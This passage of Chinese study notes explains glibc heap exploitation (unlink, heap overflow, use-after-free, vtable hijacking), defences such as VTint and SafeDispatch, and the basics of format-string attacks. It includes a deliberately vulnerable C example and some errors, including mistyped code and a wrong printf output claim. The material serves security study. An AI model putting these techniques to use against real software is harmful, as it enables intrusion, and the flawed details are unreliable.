</p>\n</li>\n<li><ul>\n<li>unlink，top</li>\n</ul>\n</li>\n</ul>\n<p><strong>unlink</strong></p>\n<ul>\n<li>从链表中删除结点，并更新BK/FD</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204020527.png\" alt=\"image-20210625204020527\" style=\"zoom:50%;\" />\n\n<p>#define unlink(p,BK,FD)<br> {<br>   FD = p -&gt; fd;<br>   BK = p -&gt; bk;<br>   FD -&gt; bk = BK;<br>   BK -&gt; fd = FD;<br> }</p>\n<p><strong>什么时候进行unlink</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204048786.png\" alt=\"image-20210625204048786\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>free chunk从双向链表中被取出     </p>\n</li>\n<li><ul>\n<li>一种情况：与它物理相邻的堆块合并</li>\n<li>另一种情况：回应系统的分配请求</li>\n</ul>\n</li>\n<li><p>如果空闲堆块被损害？</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204119490.png\" alt=\"image-20210625204119490\" style=\"zoom:50%;\" />\n\n<p><strong>当chunk被unlink时</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204132422.png\" alt=\"image-20210625204132422\" style=\"zoom:50%;\" />\n\n<p><strong>main_areana 地址</strong></p>\n<ul>\n<li>运行时libc基地址</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204159171.png\" alt=\"image-20210625204159171\" style=\"zoom:50%;\" />\n\n<p>编译时确定的main_arena的偏移</p>\n<p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204227122.png\" alt=\"image-20210625204227122\"></p>\n<p>运行时main_arena的地址</p>\n<p>0xf7e16000 + 0x001BA420= 0xf7fd0420</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204302602.png\" alt=\"image-20210625204302602\" style=\"zoom:50%;\" />\n\n<p><strong>main_arena内容</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204321373.png\" alt=\"image-20210625204321373\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204358309.png\" alt=\"image-20210625204358309\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>free()和malloc()依赖于元数据(chunk的头部信息)来     </p>\n</li>\n<li><ul>\n<li>遍历      bins/lists/chunks</li>\n<li>将内存返回给用户</li>\n</ul>\n</li>\n<li><p>但是这些元数据没有很好的保护 </p>\n</li>\n<li><ul>\n<li>堆溢出，use-after-free</li>\n</ul>\n</li>\n</ul>\n<p><strong>堆溢出利用</strong></p>\n<p><strong>Glibc：Chunk In Use</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204532029.png\" alt=\"image-20210625204532029\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>prev_size 区域 </p>\n</li>\n<li><ul>\n<li>属于前一个chunk</li>\n<li>如果前一个chunk是free状态（并且不在fastbin）就会被设置</li>\n</ul>\n</li>\n<li><p>prev_in_use </p>\n</li>\n<li><ul>\n<li>若前一个chunk是free状态（并且不在fastbin）则置0</li>\n</ul>\n</li>\n<li><p>is_mmaped </p>\n</li>\n<li><ul>\n<li>是否是通过mmap()产生的</li>\n</ul>\n</li>\n<li><p>non_main_arena</p>\n</li>\n</ul>\n<p><strong>Glibc:被释放的chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204722491.png\" alt=\"image-20210625204722491\" style=\"zoom:50%;\" />\n\n<ul>\n<li>下一个chunk的prev_size 这个free chunk的长度</li>\n<li>下一个chunk的prev_in_use 为0</li>\n<li>但是 如果这个被释放的chunk在fastbin，这些东西就不会被设置</li>\n<li>这个 chunk 是否属于一个线程的     arena</li>\n</ul>\n<p><strong>堆溢出</strong></p>\n<ul>\n<li><p>基本上与栈溢出基本类似</p>\n</li>\n<li><p>栈溢出的目标 </p>\n</li>\n<li><ul>\n<li>返回地址</li>\n<li>保存在栈帧的指针</li>\n<li>局部函数变量</li>\n<li>异常句柄</li>\n<li>其他敏感数据</li>\n</ul>\n</li>\n<li><p>堆溢出的目标 </p>\n</li>\n<li><ul>\n<li>堆的元数据</li>\n<li>对象中的函数指针</li>\n<li>对象中的vtable指针</li>\n<li>其他敏感数据</li>\n</ul>\n</li>\n</ul>\n<p><strong>例子</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"function\">struct <span class=\"title\">toystr</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">void</span></span> (* message)(<span class=\"keyword\">char</span> *);</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buffer[<span class=\"number\">20</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\tcoolguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">\tlameguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">\tcoolguy -&gt; message = &amp;print_cool;</span><br><span class=\"line\">\tlameguy -&gt; message = &amp;print_meh;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input coolguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">\tcoolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input lameguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">\tcoolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tcoolguy-&gt;<span class=\"built_in\">message</span>(coolguy-&gt;buffer);</span><br><span class=\"line\">\tlameguy-&gt;<span class=\"built_in\">message</span>(lameguy-&gt;buffer);</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205042187.png\" alt=\"image-20210625205042187\" style=\"zoom:50%;\" />\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">coolguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">lameguy = <span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(struct toystr))</span><br><span class=\"line\">coolguy -&gt; message = &amp;print_cool;</span><br><span class=\"line\">lameguy -&gt; message = &amp;print_meh;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input coolguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">coolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input lameguy&#x27;s name:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">fgets</span>(coolguy-&gt;fuffer,<span class=\"number\">200</span>,stdin);</span><br><span class=\"line\">coolguy-&gt;buffer[<span class=\"built_in\">strcspn</span>(coolguy-&gt;buffer,<span class=\"string\">&quot;\\n&quot;</span>)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">coolguy-&gt;<span class=\"built_in\">message</span>(coolguy-&gt;buffer);</span><br><span class=\"line\">lameguy-&gt;<span class=\"built_in\">message</span>(lameguy-&gt;buffer);<span class=\"comment\">//&lt;--------被溢出覆盖的函数指针</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>堆溢出有什么其他的利用方法？ </p>\n</li>\n<li><ul>\n<li>对象中的函数指针</li>\n<li>管理堆的元数据</li>\n<li>VTable指针</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出一个正在被使用的chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205135042.png\" alt=\"image-20210625205135042\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 p bit（prev_in_use） </p>\n</li>\n<li><ul>\n<li><p>从0改变成1 </p>\n</li>\n<li><ul>\n<li>当这个chunk被free，前一个chunk不会被合并</li>\n<li>note：只有被free的chunk比fast-bin-size大时才会发生合并操作</li>\n</ul>\n</li>\n<li><p>从1改变成0 </p>\n</li>\n<li><ul>\n<li>当这个chunk被free时，前一个chunk会被合并</li>\n<li>Q1:前一个”free”状态chunk的大小？</li>\n<li>Q2:什么时候会发生合并？</li>\n<li>如果合并的free       chunk接下来被分配给其他对象，那么两个不同的对象会共享同一段内存</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>溢出 N bit（non_main_arena） </p>\n</li>\n<li><ul>\n<li><p>从0改变成1 </p>\n</li>\n<li><ul>\n<li>会标志其为non_main_arena，切换arena</li>\n<li>当这个chunk被释放，将会被添加到fastbin或者unsorted_bin</li>\n<li>指向fastbin/unsorted_bin的指针会更新</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出一个free chunk</strong></p>\n<ul>\n<li><p>溢出 P bit     （prev_in_use） </p>\n</li>\n<li><ul>\n<li><p>从1改变成0 </p>\n</li>\n<li><ul>\n<li>Q1：如果被分配给对象，P bit会被堆管理器纠正吗？</li>\n<li>Q2:如果这个chunk被其他free chunk合并了呢？<br>e.g.：该free chunk之后的chunk被释放，其会尝试向前面的chunk合并，得到一个非预期大小的free chunk</li>\n<li>这个free       chunk可以在稍后分配新的对象，新的对象会和前面的chunk共享内存</li>\n<li>Q3:如果这个chunk在bins之间移动？</li>\n</ul>\n</li>\n<li><p>从0改变成1，前面的free      chunk将不会被合并</p>\n</li>\n<li><p>被释放的堆快由arena/fastbin追踪记录</p>\n</li>\n<li><p>被释放的堆快可以在稍后分配给新的对象，或者被新的free chunk合并，或者按照 fastbin-&gt;unsorted_bin-&gt;smallbin/largebin的顺序移动    </p>\n</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205424699.png\" alt=\"image-20210625205424699\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 size 区域 </p>\n</li>\n<li><ul>\n<li>如果该chunk被分配？</li>\n<li>如果该chunk被物理相邻的chunk合并？</li>\n<li>如果这个chunk在bins间移动？</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205445914.png\" alt=\"image-20210625205445914\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>溢出 fd/bk指针 </p>\n</li>\n<li><ul>\n<li>产生 unlink 问题</li>\n</ul>\n</li>\n<li><p>溢出 prev_size 区域 </p>\n</li>\n<li><ul>\n<li><p>如果缩小prev_size </p>\n</li>\n<li><ul>\n<li><p>当下一个chunk被释放时，会发生什么？       </p>\n</li>\n<li><ul>\n<li>会尝试合并当前chunk（的一部分）</li>\n<li>当前chunk（的一部分）将被unlink，导致unlink操作到假的fd/bk指针，并且当前        free chunk和合并的chunk重叠。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>如果放大prev_size </p>\n</li>\n<li><ul>\n<li><p>当下一个chunk被释放时，会发生什么？       </p>\n</li>\n<li><ul>\n<li>会尝试合并当前chunk（大于实际）</li>\n<li>（大于实际）的当前堆快将被unlink，导致unlink操作到假的fd/bk指针，并且前面（正在使用）的chunk会和新合并的free        chunk共享内存</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>溢出TOP chunk的size区域</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205532518.png\" alt=\"image-20210625205532518\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>缩小size </p>\n</li>\n<li><ul>\n<li>浪费内存</li>\n</ul>\n</li>\n<li><p>放大size </p>\n</li>\n<li><ul>\n<li>新的分配请求总是能被TOP      chunk满足</li>\n<li>这个（比实际大的）TOP      chunk可以覆盖包括 code/data,e.g.,got表，那么任意地址都可以被分配请求返回</li>\n</ul>\n</li>\n</ul>\n<p><strong>防御堆溢出</strong></p>\n<ul>\n<li><p>cookie </p>\n</li>\n<li><ul>\n<li>与StackGuard/GS（在返回地址附近插入cookie）类似，我们可以在堆对象附近插入cookie。</li>\n</ul>\n</li>\n<li><p>但是 </p>\n</li>\n<li><ul>\n<li><p>运行时开销非常大</p>\n</li>\n<li><p>没有一个好的时间节点进行cookie检查：      </p>\n</li>\n<li><ul>\n<li>对于栈，在函数返回时进行检查</li>\n<li>对于堆，一个还算合理的适当malloc/free被调用时进行检查，但其可能无法对被损害的对象进行操作。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>Use-After-Free (UAF)</strong></p>\n<ul>\n<li><p>漏洞 </p>\n</li>\n<li><ul>\n<li>被释放的内存被再次释放？</li>\n<li>被释放的内存被损坏？</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205716558.png\" alt=\"image-20210625205716558\" style=\"zoom:50%;\" />\n\n<ul>\n<li>攻击<ul>\n<li>最常见的UAF攻击：VTable Hijacking</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205758688.png\" alt=\"image-20210625205758688\" style=\"zoom:50%;\" />\n\n<p><strong>UAF vulnerability(MS12-063)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205915719.png\" alt=\"image-20210625205915719\" style=\"zoom:50%;\" />\n\n<p><strong>UAF vulnerability(MS12-063)</strong><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205933444.png\" style=\"zoom:50%;\" /></p>\n<p><strong>动态分配的VTable(c++)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205958106.png\" alt=\"image-20210625205958106\" style=\"zoom:50%;\" />\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">foo</span><span class=\"params\">(Base2* obj)</span></span>&#123;</span><br><span class=\"line\">    obj-&gt;<span class=\"built_in\">vg4</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    Base2* obj = <span class=\"keyword\">new</span> <span class=\"built_in\">Sub</span>();</span><br><span class=\"line\">    <span class=\"built_in\">foo</span>(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code section</span><br><span class=\"line\">; Function main()</span><br><span class=\"line\">push SIZE</span><br><span class=\"line\">call malloc()</span><br><span class=\"line\">mov ecx, eax</span><br><span class=\"line\">call Sub::Sub()</span><br><span class=\"line\">; now ECX points to the Sub object</span><br><span class=\"line\">add ecx, 8</span><br><span class=\"line\">; now ECX points to the Sub::Base2 object</span><br><span class=\"line\">call foo()</span><br><span class=\"line\">ret</span><br><span class=\"line\">; Function foo()</span><br><span class=\"line\">mov eax, [ecx]      ; read vfptr of Base2</span><br><span class=\"line\">mov edx, [eax+0x0C] ; get vg4() from vtable</span><br><span class=\"line\">call edx            ; call Base2::vg4()</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p><strong>VTable Hijacking 分类</strong></p>\n<ul>\n<li><p>损坏VTable </p>\n</li>\n<li><ul>\n<li>覆盖VTable</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210119072.png\" alt=\"image-20210625210119072\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>VTable注入 </p>\n</li>\n<li><ul>\n<li>覆盖vfptr</li>\n<li>指向假的VTable</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210150396.png\" alt=\"image-20210625210150396\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>VTable重用 </p>\n</li>\n<li><ul>\n<li>覆盖vfptr</li>\n<li>指向包括VTable，数据等</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210205114.png\" alt=\"image-20210625210205114\" style=\"zoom:50%;\" />\n\n<p><strong>VTable Hijacking 实战</strong></p>\n<ul>\n<li>Pwn2Own 2014  firefox</li>\n<li>Pwn2Own 2014  chrome</li>\n<li>CVE-2014-1772   IE</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code section</span><br><span class=\"line\">; Function main()</span><br><span class=\"line\">push SIZE</span><br><span class=\"line\">call malloc()</span><br><span class=\"line\">mov ecx, eax</span><br><span class=\"line\">call Sub::Sub()</span><br><span class=\"line\">; now ECX points to the Sub object</span><br><span class=\"line\">add ecx, 8</span><br><span class=\"line\">; now ECX points to the Sub::Base2 object</span><br><span class=\"line\">call foo()</span><br><span class=\"line\">ret</span><br><span class=\"line\">; Function foo()</span><br><span class=\"line\">mov eax, [ecx]      ; read vfptr of Base2</span><br><span class=\"line\">mov edx, [eax+0x0C] ; get vg4() from vtable</span><br><span class=\"line\">call edx            ; call Base2::vg4()</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210304071.png\" alt=\"image-20210625210304071\" style=\"zoom:50%;\" />\n\n<p><strong>防御VTable Hijacking</strong></p>\n<p><strong>VTint</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>Attack</strong></th>\n<th><strong>Requirement</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>覆盖  VTable</td>\n<td>VTable可写</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>覆盖vfptr，指向被注入的VTable</td>\n<td>VTable可写</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>覆盖vfptr，指向包括VTable，数据</td>\n<td>形似VTable的数据，包括VTable</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>Attack</strong></th>\n<th><strong>Requirement</strong></th>\n<th><strong>解决方案</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>覆盖  VTable</td>\n<td>VTable可写</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>覆盖vfptr，指向被注入的VTable</td>\n<td>VTable可写</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>覆盖vfptr，指向包括VTable，数据</td>\n<td>形似VTable的数据，包括VTable</td>\n<td>不同的VTable/数据</td>\n</tr>\n</tbody></table>\n<p><strong>VTint vs. DEP</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>VTint</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>VTable只读</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>不同的VTable/数据</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th><strong>-</strong></th>\n<th><strong>DEP</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>VTable  破坏</td>\n<td>只读的代码段</td>\n</tr>\n<tr>\n<td>VTable  注入</td>\n<td>只读的代码段(可写的段不会被执行)</td>\n</tr>\n<tr>\n<td>VTable  重用</td>\n<td>NO</td>\n</tr>\n</tbody></table>\n<ul>\n<li><p>与DEP的相同之处 </p>\n</li>\n<li><ul>\n<li>轻量级，可以是二进制可兼容的。</li>\n</ul>\n</li>\n<li><p>不同 </p>\n</li>\n<li><ul>\n<li>加固后，可攻击面更小</li>\n</ul>\n</li>\n</ul>\n<p><strong>二进制级防护：vfGuard</strong></p>\n<p>NDSS’15: Dynamic binary instrumentation</p>\n<p>- 在运行时检查虚拟调用指令（使用PIN）</p>\n<p>- 针对指令使用不同策略</p>\n<ul>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>易于扩展，去执行不同策略</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>开销大（PIN的开销*118%）</li>\n<li>无法防御VTables重用攻击</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级防护：vfGuard</strong></p>\n<ul>\n<li><p>Microsoft IE10,     Core Objects </p>\n</li>\n<li><ul>\n<li>在VTable结束地方的特殊cookies</li>\n</ul>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>轻量级</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>只防御核心对象Core      Objects</li>\n<li>不能应付VTable注入</li>\n<li>信息泄漏</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210454607.png\" alt=\"image-20210625210454607\" style=\"zoom:50%;\" />\n\n<p><strong>源代码级防护：SafeDispatch</strong></p>\n<ul>\n<li><p>NDSS’14, LLVM-based     </p>\n</li>\n<li><ul>\n<li>静态计算一系列合法目标</li>\n<li>根据计算结果进行动态验证</li>\n</ul>\n</li>\n<li><p>策略1: VTable Check </p>\n</li>\n<li><ul>\n<li><p>劣势： </p>\n</li>\n<li><ul>\n<li>编译阶段需要耗费大量时间去分析</li>\n<li>高运行时开销（~30%）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>策略2: moethod Check </p>\n</li>\n<li><ul>\n<li><p>劣势： </p>\n</li>\n<li><ul>\n<li>编译阶段需要耗费大量时间去分析</li>\n<li>高运行时开销（~7%）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级防护：Forward Edge CFI</strong></p>\n<ul>\n<li><p>GCC-VTV     [Usenix’14], whitelist-based</p>\n<p>- 在编译阶段计算一组不完整的合法目标<br>- 在加载是通过初始化函数合并不完整的数据<br>- 在运行时检验是否合法</p>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>支持增量构建</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>运行时操作繁琐</li>\n</ul>\n</li>\n</ul>\n<p><strong>源代码级别的防护：RockJIT</strong></p>\n<ul>\n<li><p>CCS’15, CFI-based </p>\n</li>\n<li><ul>\n<li>在编译阶段收集类型信息</li>\n<li>根据收集到的信息计算加载时转移目标的等价类别</li>\n<li>更新CFI检查，在加载时只允许间接传输到一个等价类</li>\n</ul>\n</li>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>支持增量构造</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>加载时开销大</li>\n</ul>\n</li>\n</ul>\n<p>头疼≧ ﹏ ≦~~~</p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记2</span><br></pre></td></tr></table></figure>\n\n<p><strong>格式化字符串</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625195611418.png\" alt=\"image-20210625195611418\" style=\"zoom:60%;\" />\n\n<p><strong>格式化占位符</strong></p>\n<p>格式化字符串中的占位符用于指明输出的参数值如何格式化。</p>\n<table>\n<thead>\n<tr>\n<th><strong>字符</strong></th>\n<th><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>n$</td>\n<td>n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。  如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO  C。例：printf(“%2$d %2$#x; %1$d %1$#x”,16,17) 产生”17 0x11; 16  0x10”</td>\n</tr>\n</tbody></table>\n<p> Flags可为0个或多个：</p>\n<table>\n<thead>\n<tr>\n<th><strong>字 符</strong></th>\n<th align=\"left\"><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>+</td>\n<td align=\"left\">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>\n</tr>\n<tr>\n<td>空格</td>\n<td align=\"left\">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td>\n</tr>\n<tr>\n<td>-</td>\n<td align=\"left\">左对齐。缺省情况是右对齐。</td>\n</tr>\n<tr>\n<td>#</td>\n<td align=\"left\">对于’g’与’G’，不删除尾部0以表示精度。对于’f’,  ‘F’, ‘e’, ‘E’, ‘g’, ‘G’, 总是输出小数点。对于’o’, ‘x’, ‘X’, 在非0数值前分别输出前缀0, 0x, and  0X表示数制。</td>\n</tr>\n<tr>\n<td>0</td>\n<td align=\"left\">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(“%2d”,  3)输出” 3”，printf(“%02d”,  3)输出”03”。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。</td>\n</tr>\n</tbody></table>\n<p><strong>格式化占位符</strong></p>\n<p>Length指出浮点型参数或整型参数的长度。可以忽略，或者是下述：</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200440768.png\" alt=\"image-20210625200440768\" style=\"zoom:50%;\" />\n\n<p><strong>漏洞利用</strong></p>\n<ul>\n<li><p>读取数据 </p>\n</li>\n<li><ul>\n<li>%x</li>\n<li>%d</li>\n<li>%s</li>\n</ul>\n</li>\n<li><p>写入数据 </p>\n</li>\n<li><ul>\n<li>%n</li>\n</ul>\n</li>\n</ul>\n<p><strong>读取数据</strong></p>\n<p><strong>$操作符</strong></p>\n<p>读取一个特定的参数</p>\n<p>printf(“%3$s”, 1, “b”, “c”, 4);</p>\n<p>将显示3而不是对应顺序的1。其他例子：</p>\n<ul>\n<li>printf(“%3$d”,1,2,3);，显示3</li>\n<li>printf(“%3$d     %2$d %1$d”,1,2,3);，显示3 2 